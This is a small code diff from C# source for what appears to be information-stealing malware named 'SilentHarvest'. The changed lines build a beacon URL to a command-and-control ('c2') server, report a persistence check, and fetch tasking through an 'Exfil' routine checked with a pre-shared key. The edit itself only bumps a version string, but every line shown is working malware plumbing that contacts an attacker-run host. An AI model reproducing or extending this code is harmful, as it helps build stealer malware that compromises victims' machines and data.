@@ -296,7 +296,7 @@ namespace SilentHarvest
                 string burl = c2.Contains("/gate")
                     ? c2.Replace("/gate", "/beacon")
                     : c2.TrimEnd('/') + "/beacon";
-                burl += "?id=" + bid + "&v=1.0&p=" +
+                burl += "?id=" + bid + "&v=1.1.0&p=" +
                         System.Uri.EscapeDataString(Stages.CheckPersistence(pname));
                 byte[] tb = Exfil.Get(burl);
                 if (tb != null && pskBytes != null)
